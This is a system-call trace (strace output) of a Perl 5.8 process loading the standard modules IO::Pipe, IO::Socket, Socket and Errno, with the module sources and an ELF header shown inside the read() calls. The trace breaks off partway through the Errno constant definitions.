12710 07:43:45.442376 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
12710 07:43:45.443028 _llseek(6, 3425, [3425], SEEK_SET) = 0
12710 07:43:45.443047 _llseek(6, 0, [3425], SEEK_CUR) = 0
12710 07:43:45.443058 close(6)          = 0
12710 07:43:45.443082 stat64("/etc/perl/IO/Socket.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443096 stat64("/etc/perl/IO/Socket.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443110 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443123 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443151 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443164 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443179 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443191 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443204 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443216 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443230 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443243 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
12710 07:43:45.443265 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.443279 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.443295 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.443314 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
12710 07:43:45.443648 stat64("/etc/perl/Socket.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443666 stat64("/etc/perl/Socket.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.443679 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443693 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.443707 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443720 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.443734 stat64("/usr/lib/perl5/Socket.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443746 stat64("/usr/lib/perl5/Socket.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.443760 stat64("/usr/share/perl5/Socket.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443772 stat64("/usr/share/perl5/Socket.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.443785 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.443798 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
12710 07:43:45.443819 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.443833 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.443844 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.443862 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
12710 07:43:45.444261 brk(0x8239000)    = 0x8239000
12710 07:43:45.444465 read(8, "", 4096) = 0
12710 07:43:45.444481 close(8)          = 0
12710 07:43:45.444569 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12710 07:43:45.444594 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12710 07:43:45.444630 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
12710 07:43:45.444646 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
12710 07:43:45.444738 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12710 07:43:45.444757 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7ddb000
12710 07:43:45.444771 mmap2(0xb7de0000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7de0000
12710 07:43:45.444786 close(8)          = 0
12710 07:43:45.445344 brk(0x825a000)    = 0x825a000
12710 07:43:45.445493 stat64("/etc/perl/Errno.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.445510 stat64("/etc/perl/Errno.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.445529 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.445542 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.445556 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.445569 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.445584 stat64("/usr/lib/perl5/Errno.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.445597 stat64("/usr/lib/perl5/Errno.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.445610 stat64("/usr/share/perl5/Errno.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.445671 stat64("/usr/share/perl5/Errno.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.445686 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.445699 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
12710 07:43:45.445720 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.445734 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.445746 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.445766 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 